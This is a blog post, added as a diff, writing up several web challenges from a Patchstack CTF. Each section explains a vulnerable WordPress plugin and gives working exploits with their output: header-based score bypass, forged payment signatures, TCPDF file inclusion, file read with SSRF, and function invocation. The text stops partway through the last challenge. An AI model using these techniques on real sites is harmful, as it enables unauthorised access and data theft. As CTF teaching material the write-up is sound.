@@ -1,0 +1,1500 @@
+---
+layout: post
+title: "PatchstackCTF End of Year - Web"
+date: 2025-12-21
+image: /assets/.
+achievement: "3rd"
+categories: ["Patchstack"]
+tags: [web, sqli, ssti, lfi, ctf2025]
+excerpt: "This writeup win for the best writeup."
+---
+
+## AI BadBots
+
+Target: `http://18.130.76.27:9188/`
+
+### Intro
+
+So the target “installs an AI Trust Score plugin” so bots stop spamming… but the “AI” can be forced to *trust* a fake request.
+
+And the funny part: this isn’t because of the AI model, prompt injection, or anything—this is pure **math + NaN**. One request and it immediately “passes verification” and leaks `BB_SUCCESS`.
+
+---
+
+### Recon: find the entry point
+
+From the provided attachment, I started by unzipping and looking for the plugin file:
+
+```bash
+$ ls -la
+attachment.zip
+
+$ unzip attachment.zip
+```
+
+The file that most clearly “smelled like challenge logic” was:
+
+- `server-given/challenge-custom/ai-badbots/ai-badbots.php`
+
+I opened it, read it, and immediately found a trigger that’s extremely attacker-friendly: it’s just a query string.
+
+```php
+public function evaluate_request()
+{
+    if (!isset($_GET['ai-trust-check'])) {
+        return;
+    }
+
+    $this->collect_signals();
+    $this->calculate_score();
+    $this->validate_score();
+}
+```
+
+Meaning: anyone on the internet can access the “test tool” path via:
+
+```bash
+curl -i 'http://18.130.76.27:9188/?ai-trust-check=1'
+```
+
+And by default it’s rejected (403). So far, makes sense.
+
+---
+
+### Read the Code: the “AI” is just numbers
+
+The signal collection part has a few signals (User-Agent length, number of headers, cookies, path complexity, timing). The most interesting one is this “proxy-aware entropy signal”:
+
+```php
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+...
+$xff = 0;
+$headers = [
+    'HTTP_CF_CONNECTING_IP',
+    'HTTP_X_FORWARDED_FOR',
+    'HTTP_X_REAL_IP',
+    'HTTP_X_CLIENT_IP',
+    'HTTP_CLIENT_IP',
+    'HTTP_X_CLUSTER_CLIENT_IP',
+];
+foreach ($headers as $header) {
+    if (array_key_exists($header, $_SERVER)) {
+        $xff = $_SERVER[$header];
+    }
+}
+$this->signals['ip_entropy'] = strlen($ip) - strlen($xff);
+```
+
+If `X-Forwarded-For` (or other proxy headers) is longer than the real IP (`REMOTE_ADDR`), then:
+
+- `ip_entropy = strlen(ip) - strlen(xff)` becomes **negative**.
+
+Then it goes into normalization:
+
+```php
+private function normalize($value)
+{
+    if (!is_numeric($value)) {
+        return 0;
+    }
+    if ($value == 0) {
+        $value = 1;
+    }
+    return log($value) / log(10);
+}
+```
+
+There’s no guard for values `< 0`. So if `$value` is negative:
+
+- `log(negative)` ⇒ **NaN**
+
+Usually NaN is “poison” that makes validation fail. But the plot twist is right in this validation:
+
+```php
+private function validate_score()
+{
+    if (($this->score * 0) != 0 || $this->score > 0.95) {
+        $this->grant_access();
+        return;
+    }
+    $this->deny_access();
+}
+```
+
+The comment’s intent is “fail-closed”: anomalous scores should never pass. But the implementation is reversed:
+
+#### Why does NaN become “PASS”?
+
+The logic is roughly:
+
+```text
+score = average(log10(signals...))
+
+if (score * 0) != 0:
+    # this is TRUE when score = NaN (because NaN != 0)
+    GRANT
+else if score > 0.95:
+    GRANT
+else:
+    DENY
+```
+
+In PHP, `NAN != 0` evaluates to `true`. So as soon as we manage to make `score` become NaN, the left condition opens the door.
+
+---
+
+### Exploit: make `ip_entropy` negative using a long header
+
+The goal is simple:
+
+1. Make `ip_entropy = strlen(ip) - strlen(xff)` negative
+2. The negative value goes into `log()` ⇒ NaN
+3. NaN hits `($score * 0) != 0` ⇒ grant_access
+
+PoC:
+
+```bash
+curl -i -s \
+  'http://18.130.76.27:9188/?ai-trust-check=1' \
+  -H 'X-Forwarded-For: 1234567890123456789012345678901234567890'
+HTTP/1.1 200 OK
+Date: Sun, 21 Dec 2025 15:56:01 GMT
+Server: Apache/2.4.65 (Debian)
+X-Powered-By: PHP/8.3.28
+Content-Length: 19
+Content-Type: text/plain;charset=UTF-8
+
+"CTF{W0W_1T5_M4TH}"
+```
+
+Result: the server responds `200 OK` and returns `BB_SUCCESS` (the flag).
+
+### Flag
+
+`CTF{W0W_1T5_M4TH}`
+
+---
+
+## Bazaar
+
+Target: `http://18.130.76.27:9100/`
+
+### Intro
+
+The site looks “safe”: a neat landing page, a “store launching” banner, and WooCommerce which is usually *battle-tested*. But once I looked at the server contents (source code) and how the custom plugin handles “payments”, the vibe changed immediately: this isn’t a small bug—this is a *payment bypass* that ends up giving us a product download link without needing to be a registered user.
+
+In this write-up I explain the flow from recon to exploit: why the endpoint can be called without login, why the signature can be forged, and how that ends up leaking the download link.
+
+---
+
+### Recon: “the store isn’t open, but the backend already says a lot”
+
+First, check the website:
+
+```bash
+curl -i http://18.130.76.27:9100/
+```
+
+Clearly WordPress + WooCommerce. In web challenges, the *sweet spot* is often `admin-ajax.php`, so I noted the endpoint:
+
+```
+/wp-admin/admin-ajax.php
+```
+
+Since this is whitebox, I moved to the most “worth it” thing: find the custom plugin.
+
+---
+
+### Read the code: found the “Bazaar” plugin (and two wide-open endpoints)
+
+In the source (container) there’s a plugin:
+
+`server-given/challenge-custom/bazaar/payment-flow.php`
+
+Inside it there are two hooks that immediately woke me up:
+
+```php
+add_action('wp_ajax_nopriv_bazaar_process_payment', 'bazaar_handle_purchase_submission');
+add_action('wp_ajax_nopriv_get_bazaar_order', 'get_bazaar_order');
+```
+
+`wp_ajax_nopriv_*` means: **it can be called without login**.
+
+Now the only question is: “what does it do?”
+
+---
+
+### Part 1 — a “Payment” endpoint we can *forge*
+
+Still in `payment-flow.php`, `bazaar_handle_purchase_submission()` checks a signature header:
+
+```php
+$payload = file_get_contents('php://input');
+$header = getallheaders();
+$sig_header = $header['X-Signature'] ?? '';
+
+$secret = get_option('bazaar_secret');
+
+if (verifyHeader($payload, $sig_header, $secret)) {
+    $charge = bazaar_simulate_charge_from_cart($data);
+}
+```
+
+Signature verification lives in:
+
+`server-given/challenge-custom/bazaar/SignatureVerification.php`
+
+The core idea is:
+
+```php
+$signedPayload = "{$timestamp}.{$payload}";
+$expectedSignature = hash_hmac('sha256', $signedPayload, $secret);
+```
+
+The issue isn’t the HMAC (that’s fine), but **secret management**:
+
+- `bazaar_secret` is pulled from `get_option('bazaar_secret')`
+- in the challenge deploy script/tooling, this option is **never set**
+- in PHP, an empty/false secret ends up as an HMAC key of empty string (`""`)
+
+If the key is empty, we can generate the “signature” ourselves.
+
+---
+
+### Part 2 — a “get order” endpoint that leaks the download link
+
+Now the second endpoint:
+
+```php
+add_action('wp_ajax_nopriv_get_bazaar_order', 'get_bazaar_order');
+```
+
+`get_bazaar_order()` accepts `order_key`, then returns the order details as JSON. And the most crucial part: if the product is downloadable, it also returns the direct download URL:
+
+```php
+if ( $product && $product->is_downloadable() ) {
+    foreach ( $product->get_downloads() as $download ) {
+        $downloads[] = [
+            'name' => $download->get_name(),
+            'file' => $download->get_file(), // Direct URL
+        ];
+    }
+}
+```
+
+So the game plan is clear:
+
+1) create a “completed” order via the payment endpoint (without actually paying)  
+2) grab `order_key` from the “order received” redirect  
+3) query `get_bazaar_order` using `order_key`  
+4) take `downloads[].file` → fetch the file
+
+---
+
+### Exploit: cart → order → download
+
+#### 1) Find an interesting product
+
+The shop page doesn’t always show a product list:
+
+```bash
+curl -s 'http://18.130.76.27:9100/?s=Flaggable-Download' | rg -n 'product/flaggable-download'
+```
+
+The product is at:
+
+```
+/product/flaggable-download/
+```
+
+From the HTML, WordPress includes `postid-11`, so the product ID is `11`.
+
+#### 2) Add it to cart (to create a cart session)
+
+Using a cookie jar:
+
+```bash
+curl -s -c cookies.txt 'http://18.130.76.27:9100/?add-to-cart=11' > /dev/null
+```
+
+#### 3) Forge the signature + “process payment”
+
+The header format used by `verifyHeader()` is roughly:
+
+```
+X-Signature: t=<unix_ts>,v1=<hex_hmac_sha256>
+```
+
+The HMAC input is: `"{timestamp}.{raw_body}"`
+
+Because `bazaar_secret` is empty, the HMAC key is also empty. I made a script to make it easier:
+
+```py
+import time, hmac, hashlib, requests, urllib.parse, re
+
+BASE = "http://18.130.76.27:9100"
+s = requests.Session()
+
+# 1) seed cart
+s.get(f"{BASE}/?add-to-cart=11")
+
+# 2) craft body (urlencoded)
+fields = [
+    ("product_id", "11"),
+    ("price", "10"),
+    ("cart_id", "testcart"),
+    ("customer_email", "test@example.com"),
+    ("payment_token", "tok_test"),
+]
+payload = urllib.parse.urlencode(fields)
+
+# 3) forge signature with empty secret
+ts = int(time.time())
+signed = f"{ts}.{payload}".encode()
+sig = hmac.new(b"", signed, hashlib.sha256).hexdigest()
+hdr = {"X-Signature": f"t={ts},v1={sig}", "Content-Type": "application/x-www-form-urlencoded"}
+
+# 4) process payment (get order-received redirect)
+r = s.post(f"{BASE}/wp-admin/admin-ajax.php?action=bazaar_process_payment",
+           data=payload, headers=hdr, allow_redirects=False)
+loc = r.headers["Location"]
+print("[+] redirect:", loc)
+
+# 5) extract order_key from redirect URL
+order_key = re.search(r"[?&]key=([^&]+)", loc).group(1)
+print("[+] order_key:", order_key)
+
+# 6) fetch order JSON (nopriv)
+j = requests.post(f"{BASE}/wp-admin/admin-ajax.php?action=get_bazaar_order",
+                  data={"order_key": order_key}).json()
+file_url = j["data"]["items"][0]["downloads"][0]["file"].replace("\\/", "/")
+print("[+] file_url:", file_url)
+
+# 7) download file
+print("[+] file content:", requests.get(file_url).text.strip())
+```
+
+When run, the last output shows the content of the downloadable file (the flag), because the `.txt` file in uploads is publicly accessible.
+
+```bash
+$ python3 solve.py                              
+[+] redirect: http://18.130.76.27:9100/checkout/order-received/136/?key=wc_order_WgoLTrPjtZap6
+[+] order_key: wc_order_WgoLTrPjtZap6
+[+] file_url: http://18.130.76.27:9100/wp-content/uploads/bazaar/flag-7a0ae62f24363ffc55e2129632f29d71.txt
+[+] file content: CTF{why_pay_f0r_0nl1n3_pr0ductz_wh3n_u_cAn_g3t_1t_f0R_fr33}
+```
+
+### Flag
+
+`CTF{why_pay_f0r_0nl1n3_pr0ductz_wh3n_u_cAn_g3t_1t_f0R_fr33}`
+
+---
+
+## Dark Library
+
+Target: `http://18.130.76.27:9107/`
+
+### Intro
+
+This website “sells database leaks” with a dark UI, an SVG upload button, and one sweet promise (not a political promise): *“SVG files will be processed and previewed as PDF to prevent STORED XSS.”*  
+I love this part—because usually, the phrase “to make it safe” is a polite way to say: *“behind the scenes there’s a converter ready to be forced to work.”*
+
+---
+
+### Recon: “what can we attack from the UI?”
+
+Open the homepage: the most obvious feature is SVG upload. Usually, the “SVG → PDF” pipeline is risky:
+
+- SVG is XML (lots of parser edge cases).
+- PDF generators often have features like “load a resource/font/image from a path”.
+- And if there’s a “special” library, there’s often a “special” bug too.
+
+Since this is whitebox, I immediately looked for what triggers the conversion from the frontend side.
+
+In the `dark-library` theme, the JS file is obvious:
+
+```js
+// extracted/server-given/challenge-custom/dark-library/shadow-archive.js
+formData.append('action', 'shadow_archive_svg_to_pdf');
+formData.append('svg_content', svgContent);
+formData.append('font_family', ''); // “vulnerable parameter”
+
+fetch(ajaxurl || '/wp-admin/admin-ajax.php', {
+  method: 'POST',
+  body: formData
+})
+```
+
+So the endpoint is:
+
+- `POST /wp-admin/admin-ajax.php`
+- with `action=shadow_archive_svg_to_pdf`
+
+WordPress AJAX actions like this are often “open” if registered with `wp_ajax_nopriv_*`. Check the server side.
+
+---
+
+### Read the code: found a handler with “intent: preview”
+
+In the theme `functions.php`:
+
+```php
+// extracted/server-given/challenge-custom/dark-library/functions.php
+add_action('wp_ajax_shadow_archive_svg_to_pdf', 'shadow_archive_svg_to_pdf');
+add_action('wp_ajax_nopriv_shadow_archive_svg_to_pdf', 'shadow_archive_svg_to_pdf');
+```
+
+Yup: **accessible without login**.
+
+The handler:
+
+```php
+function shadow_archive_svg_to_pdf() {
+  $svg_content = $_POST['svg_content'];
+  $font_family = isset($_POST['font_family']) ? $_POST['font_family'] : '';
+
+  require_once(get_template_directory() . '/assets/libraries/TCPDF/tcpdf.php');
+
+  $pdf = new TCPDF(...);
+  $pdf->AddPage();
+
+  $svgString = "<svg width=\"200\" height=\"200\">";
+  if (!empty($font_family)) {
+    $svgString .= "<text x=\"20\" y=\"20\" font=\"empty\" font-family=\"" . esc_attr($font_family) . "\">test</text>";
+  }
+  $svgString .= $svg_content;
+  $svgString .= "</svg>";
+
+  $pdf->ImageSVG('@' . $svgString, ...);
+  $pdf->Output($filename, 'D');
+}
+```
+
+Two things immediately made me suspicious:
+
+1) `font_family` is **not validated** in PHP (only `esc_attr`, that’s *escaping*, not *validation*).  
+2) They intentionally add `font="empty"` when `font_family` is not empty. This is… extremely specific.
+
+I suspected this wasn’t an “accident”, but a *setup* for a specific TCPDF bug.
+
+---
+
+### Dissecting TCPDF: the bug isn’t in WordPress—but in the “special library”
+
+Because this is whitebox, we can dig into the `TCPDF` library included in the attachment.
+
+High-level flow:
+
+- `ImageSVG()` parses the SVG as XML.
+- When it sees a `<text>` element, it calls `setSVGStyles()`.
+- There, TCPDF chooses the font and ends up calling `setFont(...)`.
+- `setFont()` calls `AddFont()`, which eventually does `include($fontfile)` to load a “font definition file”.
+
+Normally, the font name is “cleaned” first so it becomes only `helvetica`, `times`, etc. There’s a function:
+
+```php
+// extracted/server-given/challenge-custom/dark-library/assets/libraries/TCPDF/tcpdf.php
+public function getFontFamilyName($fontfamily) {
+  $fontfamily = preg_replace('/[^a-z0-9_\,]/', '', strtolower($fontfamily));
+  ...
+}
+```
+
+If this path is used, a string like `/tmp/flag` should become `tmpflag` (slashes removed), so we can’t point at an OS file path.
+
+But… there’s a branch that **bypasses** this sanitizer:
+
+```php
+// extracted/.../TCPDF/tcpdf.php (setSVGStyles)
+if (!empty($svgstyle['font'])) {
+  if (preg_match('/font-family.../', $svgstyle['font'], $regs)) {
+    $font_family = $this->getFontFamilyName($regs[1]);
+  } else {
+    $font_family = $svgstyle['font-family']; // <- UNSAFE PATH: no getFontFamilyName()
+  }
+} else {
+  $font_family = $this->getFontFamilyName($svgstyle['font-family']);
+}
+```
+
+Key point: **if the `font` attribute exists and is not empty**, but it does not contain the `font-family: ...` pattern, TCPDF uses `font-family` raw without `getFontFamilyName()`.
+
+And now that weird line in the theme makes sense:
+
+> `font="empty"`
+
+They intentionally ensure `svgstyle['font']` is non-empty (`"empty"`), so TCPDF falls into that dangerous `else` branch.
+
+---
+
+### Where is the “server secret” stored?
+
+In the challenge Dockerfile:
+
+```dockerfile
+# extracted/server-given/Dockerfile
+RUN echo "<?php printf('CTF{REDACTED}');?>" > /tmp/flag.php && chmod 644 /tmp/flag.php
+```
+
+The flag is stored as a PHP file that prints the flag when `include`d.
+
+Now we just need a way to make TCPDF do:
+
+```
+include("/tmp/flag.php");
+```
+
+And that happens in `AddFont()` when it looks for a font definition file:
+
+```php
+// extracted/.../TCPDF/tcpdf.php (AddFont)
+$tmp_fontfile = str_replace(' ', '', $family).strtolower($style).'.php';
+...
+include($fontfile);
+```
+
+If we can set `$family` to `/tmp/flag`, then `$tmp_fontfile` becomes:
+
+```
+/tmp/flag.php
+```
+
+Boom.
+
+---
+
+### Exploit:
+
+What we need to do:
+
+- Call the AJAX action `shadow_archive_svg_to_pdf`
+- Send `font_family=/tmp/flag`
+- Send any SVG (minimal `<text>` is enough)
+
+```bash
+curl -sS -X POST 'http://18.130.76.27:9107/wp-admin/admin-ajax.php' \
+  -d 'action=shadow_archive_svg_to_pdf' \
+  --data-urlencode 'svg_content=<text x="10" y="50">hi</text>' \
+  --data-urlencode 'font_family=/tmp/flag' \
+  -d 'x=15' -d 'y=30' -d 'w=' -d 'h='
+CTF{wh3n_you_g0nna_upd4t3_l1brari3s}<strong>TCPDF ERROR: </strong>The font definition file has a bad format: /tmp/flag.php
+```
+
+Output:
+
+- The flag prints first (the `printf` output from `/tmp/flag.php`)
+- then TCPDF errors because the file isn’t a valid “font definition”
+
+### Flag
+
+`CTF{wh3n_you_g0nna_upd4t3_l1brari3s}`
+
+---
+
+## Klunked
+
+Target: `http://18.130.76.27:9147/`
+
+### Intro
+
+This challenge starts with a sentence that sounds “safe”: *“I like a clean website with high-quality images from trusted sources. What else do you need besides this all‑in‑one plugin?”*
+
+Turns out the answer isn’t “CDN”, “cache”, or “WebP compression” — but: **a proper permission check**, **a nonce that isn’t exposed publicly**, and **not rendering a watermark from an OS-level file path**.
+
+In this write-up I explain the flow from recon to the exploit chain that ends up “turning” `/flag.txt` into a watermark on an image, which we then fetch via a public URL.
+
+---
+
+### Recon: what’s exposed without login?
+
+First I opened the homepage, then immediately focused on something that often “leaks” in WordPress: global JS configuration.
+
+```bash
+curl -s http://18.130.76.27:9147/ | rg -n "window\\.KLUNK|admin-ajax\\.php"
+```
+
+In the source there’s a global object like this:
+
+```js
+window.KLUNK = {
+  "ajax_url":"http://18.130.76.27:9147/wp-admin/admin-ajax.php",
+  "knonce_<tag>":"<nonce>"
+};
+```
+
+That’s enough to conclude two things:
+
+1) There’s an **AJAX endpoint** callable from outside (`admin-ajax.php`).
+2) There’s a **nonce** exposed to all visitors (guests).
+
+Since this is a whitebox challenge, I went straight to reading the plugin.
+
+---
+
+### Read the code: dissecting the “Klunk” plugin
+
+The custom plugin is in `server-given/challenge-custom/klunk/`.
+
+#### 1) The nonce is shared publicly
+
+`src/admin/class-script-loader.php` puts the nonce in `wp_enqueue_scripts` (frontend), meaning **guests also get the nonce**:
+
+```php
+wp_add_inline_script(
+  'klunk-frontend',
+  'window.KLUNK = ' . wp_json_encode($data) . ';',
+  'before'
+);
+```
+
+#### 2) There are `nopriv` AJAX actions
+
+`src/admin/class-admin.php` registers handlers for guests too:
+
+```php
+add_action('wp_ajax_nopriv_klunk_<tag>_upl', [ $this, 'upload_pic_ajax' ]);
+add_action('wp_ajax_nopriv_klunk_<tag>_save_wm_ajax', [ $this, 'save_wm_ajax' ]);
+```
+
+So: as long as we have the nonce, we can:
+
+- upload a `.rawpic` file (actually a real PNG, just with a weird extension)
+- write a watermark `.txt` file into the uploads folder
+
+#### 3) The REST endpoint “watermark” permission check is broken
+
+In `src/admin/class-metadata.php` there’s `permission_check()`:
+
+```php
+public function permission_check() {
+  if (!wp_get_current_user() && !current_user_can('upload_files') && !current_user_can('edit_posts')) {
+    return false;
+  }
+  return true;
+}
+```
+
+Two problems:
+
+- `wp_get_current_user()` in WordPress returns a user object (even when not logged in), so `!wp_get_current_user()` is usually **false**.
+- The condition uses `&&`, so to fail it must be “no user” **and** no capability **and** no other capability. In practice: **this permission_callback almost always passes**.
+
+Meaning the route `PUT /wp-json/klunk/v1/watermark` can be called without login.
+
+#### 4) LFI: the watermark can be “read” from a file path
+
+Still in `add_watermark()`:
+
+```php
+$string = is_readable($data['watermark'])
+  ? ( ($tmp = @file_get_contents($data['watermark'])) === false ? $data['watermark'] : $tmp )
+  : (string) $data['watermark'];
+```
+
+If we set `watermark=/flag.txt`, the plugin tries `file_get_contents('/flag.txt')`, then uses the text to draw the watermark.
+
+#### 5) Small SSRF to bypass the “DMCA check”
+
+Before drawing the watermark, the plugin performs a “DMCA check”:
+
+```php
+$check_url = $proxy . '?api=' . $api . '&image=' . $image;
+$probe = wp_remote_get($check_url, ['timeout' => 3]);
+...
+if (strpos($body, 'accept') === false) { deny; }
+```
+
+`proxy` is restricted to internal IPs (loopback/private ranges), but **loopback (`127.0.0.1`) is explicitly allowed**.
+
+The trick: create `accept.txt` in uploads (via the AJAX `save_wm_ajax`), then set proxy to:
+
+```
+127.0.0.1/wp-content/uploads/accept.txt
+```
+
+When WordPress GETs that URL, the response contains `accept`, and the check passes.
+
+---
+
+### Exploit chain: guest → “render /flag.txt into PNG”
+
+The chain is really clean:
+
+1) Grab `<tag>` and `<nonce>` from `window.KLUNK` on the homepage.
+2) Call AJAX `save_wm_ajax` to create `/wp-content/uploads/accept.txt` containing `accept`.
+3) Call AJAX `upl` to upload a small PNG as `.rawpic` to `/wp-content/uploads/upl/pic_<id>.rawpic`.
+4) Call REST `PUT /wp-json/klunk/v1/watermark` with:
+   - `image=/wp-content/uploads/upl/pic_<id>.rawpic`
+   - `watermark=/flag.txt`
+   - `proxy=127.0.0.1/wp-content/uploads/accept.txt`
+5) Fetch the output PNG from `/wp-content/uploads/processed/image_<rand>.png` → read the watermark = flag.
+
+---
+
+### PoC
+
+Grab the nonce first:
+
+```bash
+curl -s http://18.130.76.27:9147/ | rg -o '\"knonce_[0-9a-f]{8}\":\"[0-9a-f]+\"'
+```
+
+Example result:
+
+- `TAG=bd28fa33`
+- `NONCE=d0254be0d2`
+
+1) Create `accept.txt`:
+
+```bash
+curl -s -X POST 'http://18.130.76.27:9147/wp-admin/admin-ajax.php' \
+  -d "action=klunk_${TAG}_save_wm_ajax" \
+  -d "knonce_${TAG}=${NONCE}" \
+  -d "watermark=accept" \
+  -d "filename=accept.txt"
+```
+
+2) Upload a PNG as `.rawpic` (needs a small PNG file; e.g. `tiny.png`):
+
+```bash
+curl -s -X POST 'http://18.130.76.27:9147/wp-admin/admin-ajax.php' \
+  -F "action=klunk_${TAG}_upl" \
+  -F "knonce_${TAG}=${NONCE}" \
+  -F "file=@tiny.png;filename=x.rawpic;type=image/png"
+```
+
+The response provides `file_id`. Then call the watermark endpoint:
+
+```bash
+curl -s -X PUT 'http://18.130.76.27:9147/wp-json/klunk/v1/watermark' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "image": "/wp-content/uploads/upl/pic_<file_id>.rawpic",
+    "watermark": "/flag.txt",
+    "proxy": "127.0.0.1/wp-content/uploads/accept.txt"
+  }'
+```
+
+The output contains the processed file path, for example:
+
+```json
+{"success":true,"image_path":"\/var\/www\/html\/wp-content\/uploads\/processed\/image_deadbeef.png"}
+```
+
+Fetch it via browser/curl:
+
+```bash
+curl -s 'http://18.130.76.27:9147/wp-content/uploads/processed/image_deadbeef.png' -o out.png
+```
+
+In `out.png`, the watermark is the flag.
+
+---
+
+### Flag
+
+`CTF{KLUNKED_2_EXFILTRATED_0z933}`
+
+---
+
+## Super Malware Scanner
+
+Target: `http://18.130.76.27:9155/`
+
+### Intro
+
+This challenge is titled “Super Malware Scanner”, but the vibe is more like: *a scanner that secretly becomes malware*.
+
+We’re given **white-box** (source available), so the goal isn’t brute force, but **following the code flow until you find a realistic “oops”**: a public REST endpoint + a “deobfuscation” feature that’s way too confident, and then… the flag gets called by itself.
+
+---
+
+### Recon: find the attack surface
+
+The most sensible step for whitebox: open the attachment and find an entry point reachable from outside.
+
+```bash
+unzip -q attachment.zip
+sed -n '1,260p' server-given/challenge-custom/super-malware-scanner.php
+```
+
+The first thing I understood: this plugin is installed as an **MU-plugin**:
+
+```dockerfile
+# server-given/Dockerfile
+COPY --chown=www-data:www-data challenge-custom/super-malware-scanner.php \
+  /usr/src/wordpress/wp-content/mu-plugins/super-malware-scanner.php
+```
+
+MU-plugins are auto-loaded without needing to be “enabled” from admin. Meaning: if there’s an exposed REST route/handler, it’s exposed from the start.
+
+In the plugin file, I found this REST route:
+
+```php
+register_rest_route('sms/v1', '/scan', array(
+  'methods' => 'GET',
+  'callback' => array($this, 'apiScanCode'),
+  'permission_callback' => '__return_true',
+));
+```
+
+`permission_callback` = `__return_true` means: **the endpoint is accessible by anyone, without login**.
+
+Our endpoint:  
+`GET /wp-json/sms/v1/scan`
+
+---
+
+### Follow the flow: from REST to “deobfuscate”
+
+`apiScanCode()` accepts parameters:
+
+- `payload` (required)
+- `deobfuscate` (optional)
+
+Then calls `scanCode($payload, $deobfuscate)`.
+
+In `scanCode()`, there’s a gate that looks important for exploitation:
+
+```php
+if (preg_match('/^[A-Za-z0-9+\/=]+$/', $code) && base64_decode($code, true) !== false) {
+  $code = base64_decode($code);
+} else {
+  return array('success' => false, 'message' => 'no 64e');
+}
+```
+
+So `payload` **must** look like Base64 and successfully decode.
+
+If `deobfuscate` is true, it goes into:
+
+```php
+$deobfuscated = $this->deobfuscateCode($code);
+```
+
+And this is where the **drama** begins.
+
+---
+
+### Main bug: a “deobfuscator” that turns into a gadget executor
+
+`deobfuscateCode()` has a big regex to “capture obfuscated malware patterns”, and then… it debug-prints the processing result:
+
+```php
+if (preg_match($pattern, $code, $matches)) {
+  print_r($this->processDeltaOrd($code, $matches));
+}
+```
+
+`processDeltaOrd()` processes a “function chain” from the regex match, then calls those functions via `call_user_func`:
+
+```php
+$function_chain = explode('(', $matches[7]);
+$functions = array_reverse(array_filter($function_chain));
+$data = $payload;
+
+foreach ($functions as $func) {
+  $func = trim($func);
+  if ($this->isFunc($func)) {
+    $data = call_user_func($func, $data);
+  }
+}
+```
+
+They claim it’s safe because there’s an allowlist in `isFunc()`. But… that allowlist includes:
+
+```php
+'get_option',
+```
+
+And from the Docker toolbox, the WordPress setup adds the flag as an option:
+
+```makefile
+# server-given/docker/wordpress/toolbox/Makefile
+$(WP_CLI) option add flag "CTF{REDACTED}"
+```
+
+The sharp conclusion:
+
+1. The REST endpoint is publicly accessible.
+2. We can craft input that matches the “obfuscation” regex.
+3. `processDeltaOrd()` will execute a chain of allowlisted functions.
+4. Because `get_option` is allowlisted, we can call `get_option('flag')`.
+5. The result is printed in the HTTP output (before the JSON response).
+
+This isn’t “classic RCE”, but **server-side function invocation without auth** that’s enough for *data exfiltration* (the flag).
+
+---
+
+### Exploit: craft a payload that “looks like malware”
+
+We don’t need this PHP to actually execute as code. We only need:
+
+- pass the Base64 gate
+- match `deobfuscateCode()`’s regex
+- include `(...(get_option('flag'))...)` so `matches[7]` contains `get_option`
+
+Payload (string that will be Base64-encoded):
+
+```php
+function x($y){
+$z='';
+for($i=0;$i<strlen($y);$i++){
+$y[$i]=chr(ord($y[$i])+0);
+}
+return $y;
+}
+eval(x((get_option('flag'))));
+```
+
+Generate Base64:
+
+```bash
+import base64
+code = """function x($y){
+$z='';
+for($i=0;$i<strlen($y);$i++){
+$y[$i]=chr(ord($y[$i])+0);
+}
+return $y;
+}
+eval(x((get_option('flag'))));
+"""
+print(base64.b64encode(code.encode()).decode())
+
+```
+
+Then hit the endpoint (remember: WordPress REST API prefix is `/wp-json/`):
+
+```bash
+curl -sS --get 'http://18.130.76.27:9155/wp-json/sms/v1/scan' \
+  --data-urlencode 'payload=ZnVuY3Rpb24geCgkeSl7CiR6PScnOwpmb3IoJGk9MDskaTxzdHJsZW4oJHkpOyRpKyspewokeVskaV09Y2hyKG9yZCgkeVskaV0pKzApOwp9CnJldHVybiAkeTsKfQpldmFsKHgoKGdldF9vcHRpb24oJ2ZsYWcnKSkpKTsK' \
+  --data-urlencode 'deobfuscate=1'
+CTF{763345fitalian_mafia354d33ed45df345}{"success":true,"result":{"threats_found":1,"threats":["aha! Suspicious patterns detected"],"clean":false},"message":"Scan completed"}
+```
+
+The output is a bit unique: the flag prints **first**, then the JSON follows.
+
+### Flag
+
+`CTF{763345fitalian_mafia354d33ed45df345}`
+
+---
+
+## Hachimon-Tonkou
+
+Target: `http://18.130.76.27:9120/`
+
+### Intro
+
+At first I thought this would be a “normal” WordPress challenge: find a plugin vuln → upload a shell → done. But the title said *8 gate*. So I treated it like a puzzle: open one gate, get a clue for the next gate, until the flag drops by itself.
+
+---
+
+### Recon: this is truly “whitebox”
+
+There’s only one attachment provided:
+
+```bash
+ls -la
+unzip attachment.zip
+```
+
+Inside it there’s a `server-given/` folder containing `docker-compose.yml`, `.env`, and a small WordPress plugin.
+
+The most important part is `server-given/docker/wordpress/toolbox/Makefile`:
+
+```make
+$(WP_CLI) option add ${FLAG_NAME} ${FLAG_VALUE}
+```
+
+And `server-given/.env` sets:
+
+```env
+FLAG_NAME=flaggg
+FLAG_VALUE=CTF{...}
+```
+
+Meaning the flag is stored in **wp_options** as:
+
+```sql
+SELECT option_value FROM wp_options WHERE option_name='flaggg';
+```
+
+Ok, that’s our compass: we don’t need to “read a flag file on the server”, we just need to **read that option**.
+
+Now find the entry point.
+
+---
+
+### Gate 1: a user registration endpoint without login
+
+In `server-given/docker/wordpress/toolbox/plugins/test-plugin/test-plugin.php` there’s this:
+
+```php
+add_action("wp_ajax_nopriv_register_user", "register_user");
+
+function register_user(){
+    $userdata = array(
+        'user_login' => sanitize_text_field($_POST["username"]),
+        'user_pass' => sanitize_text_field($_POST["password"]),
+        'user_email' => sanitize_text_field($_POST["email"]),
+        'role' => 'contributor',
+    );
+
+    wp_insert_user($userdata);
+    echo "user created";
+}
+```
+
+This is the first gate: **anyone** can create a `contributor` account via `admin-ajax.php`.
+
+I used curl:
+
+```bash
+curl -sS -X POST 'http://18.130.76.27:9120/wp-admin/admin-ajax.php' \
+  --data 'action=register_user&username=testuser2&password=pass1234&email=testuser2%40contoh.com'
+```
+
+Output: `user created`
+
+---
+
+### Gate 2: log in and see what we can access
+
+Standard WordPress login:
+
+```bash
+curl -sS -c /tmp/cj 'http://18.130.76.27:9120/wp-login.php' > /dev/null
+curl -sS -i -c /tmp/cj -b /tmp/cj -X POST 'http://18.130.76.27:9120/wp-login.php' \
+  --data-urlencode 'log=testuser2' \
+  --data-urlencode 'pwd=pass1234' \
+  --data-urlencode 'wp-submit=Log In' \
+  --data-urlencode 'redirect_to=http://18.130.76.27:9120/wp-admin/' \
+  --data-urlencode 'testcookie=1' | head
+```
+
+The `contributor` role is indeed limited (can’t open plugin/settings menus), but it’s enough for the next step.
+
+---
+
+### Gate 3: find a “machine” to read `wp_options`
+
+The toolbox Makefile also installs another plugin:
+
+```make
+$(WP_CLI) plugin install beaver-builder-lite-version --version="2.9.4" --activate
+```
+
+Beaver Builder Lite is big—but whitebox challenges usually want you to focus on one small but fatal bug.
+
+I downloaded the same version’s source to review carefully:
+
+```bash
+curl -sSLO https://downloads.wordpress.org/plugin/beaver-builder-lite-version.2.9.4.zip
+unzip -q beaver-builder-lite-version.2.9.4.zip
+```
+
